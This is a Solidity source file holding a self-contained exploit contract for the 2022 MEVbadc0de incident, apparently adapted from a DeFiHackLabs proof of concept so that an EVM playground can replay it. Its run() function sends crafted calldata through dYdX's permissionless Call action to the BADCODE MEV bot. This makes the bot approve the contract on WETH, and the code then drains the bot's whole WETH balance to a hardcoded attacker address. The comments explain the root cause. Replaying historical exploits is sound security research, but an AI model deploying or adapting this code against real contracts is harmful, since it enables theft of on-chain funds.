// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-09-MEVbadc0de).
//
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (ContractTest is itself the dYdX account owner, the approve spender, and the
// caller of transferFrom — there is no standalone exploit contract to deploy).
// This file is a faithful, self-contained copy of that inline attack so the
// playground can deploy it and record run(). Logic and constants are copied
// verbatim from test/MEVbadc0de_exp.sol (the only change: the drained WETH is
// forwarded to the hardcoded ATTACKER EOA at the end, instead of the test's
// `exploiter` local).
//
// Root cause: the BADCODE MEV bot exposed dYdX's ICallee.callFunction hook as a
// PUBLIC, UNAUTHENTICATED entrypoint that executes attacker-supplied data
// against itself. dYdX's permissionless `Call` action forwards to ANY callee
// with ANY data, so anyone can make the bot approve them on WETH, then drain it
// via transferFrom — zero capital, no flash loan.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function allowance(address, address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface Structs {
    struct Val {
        uint256 value;
    }

    enum ActionType {
        Deposit,
        Withdraw,
        Transfer,
        Buy,
        Sell,
        Trade,
        Liquidate,
        Vaporize,
        Call
    }

    enum AssetDenomination {
        Wei
    }

    enum AssetReference {
        Delta
    }

    struct AssetAmount {
        bool sign;
        AssetDenomination denomination;
        AssetReference ref;
        uint256 value;
    }

    struct ActionArgs {
        ActionType actionType;
        uint256 accountId;
        AssetAmount amount;
        uint256 primaryMarketId;
        uint256 secondaryMarketId;
        address otherAddress;
        uint256 otherAccountId;
        bytes data;
    }

    struct Info {
        address owner;
        uint256 number;
    }

    struct Wei {
        bool sign;
        uint256 value;
    }
}

interface DyDxPool is Structs {
    function getAccountWei(Info memory account, uint256 marketId) external view returns (Wei memory);

    function operate(Info[] memory, ActionArgs[] memory) external;
}

contract MEVbadc0deExploit {
    // --- victims (Ethereum mainnet, fork block 15,625,424) --------------------
    IERC20 internal constant weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    DyDxPool internal constant pool = DyDxPool(0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e);
    address internal constant MEVBOT = 0xbaDc0dEfAfCF6d4239BDF0b66da4D7Bd36fCF05A;

    // The EOA that receives the drained WETH (Foundry `vm.addr(31337)` in the PoC).
    address internal constant ATTACKER = 0x4A130A95fB6EAdDFBaBB718D263cA0E4732d491E;

    function run() public {
        Structs.Info[] memory infos = new Structs.Info[](1);
        infos[0] = Structs.Info({owner: address(this), number: 1});

        Structs.ActionArgs[] memory args = new Structs.ActionArgs[](1);
        args[0] = Structs.ActionArgs({
            actionType: Structs.ActionType.Call,
            accountId: 0,
            amount: Structs.AssetAmount({
                sign: false,
                denomination: Structs.AssetDenomination.Wei,
                ref: Structs.AssetReference.Delta,
                value: 0
            }),
            primaryMarketId: 0,
            secondaryMarketId: 0,
            otherAddress: MEVBOT,
            otherAccountId: 0,
            data: bytes.concat(
                abi.encode(
                    0x0000000000000000000000000000000000000000000000000000000000000003,
                    address(pool),
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    0x00000000000000000000000000000000000000000000000000000000000000e0,
                    0x0000000000000000000000000000000000000000000beff1ceef246ef7bd1f,
                    0x0000000000000000000000000000000000000000000000000000000000000001,
                    0x0000000000000000000000000000000000000000000000000000000000000020,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    address(this),
                    address(weth)
                ),
                abi.encode(
                    0x00000000000000000000000000000000000000000000000000000000000000a0,
                    address(this),
                    0x0000000000000000000000000000000000000000000000000000000000000040,
                    0x00000000000000000000000000000000000000000000000000000000000000a0,
                    0x0000000000000000000000000000000000000000000000000000000000000004,
                    0x4798ce5b00000000000000000000000000000000000000000000000000000000,
                    0x0000000000000000000000000000000000000000000000000000000000000002,
                    0x0000000000000000000000000000000000000000000000000000000000000004,
                    0x0000000000000000000000000000000000000000000000000000000000000001,
                    0x0000000000000000000000000000000000000000000000000000000000000001,
                    0x0000000000000000000000000000000000000000000000000000000000000002,
                    0x0000000000000000000000000000000000000000000000000000000000000002
                )
            )
        });

        // Trigger the unauthenticated callback: dYdX forwards a Call action to the
        // bot, which executes our attacker-supplied data and approves `address(this)`
        // on its WETH.
        pool.operate(infos, args);

        // The bot has now granted this contract a near-infinite WETH allowance.
        // Drain its ENTIRE WETH balance and forward it to the attacker EOA.
        uint256 loot = weth.balanceOf(MEVBOT);
        weth.transferFrom(MEVBOT, ATTACKER, loot);
    }

    // The bot's decoder ends up calling a bespoke selector (0x00000000…) back on
    // the caller; the original test provides a no-op fallback for it. Keep it.
    fallback() external {}
}
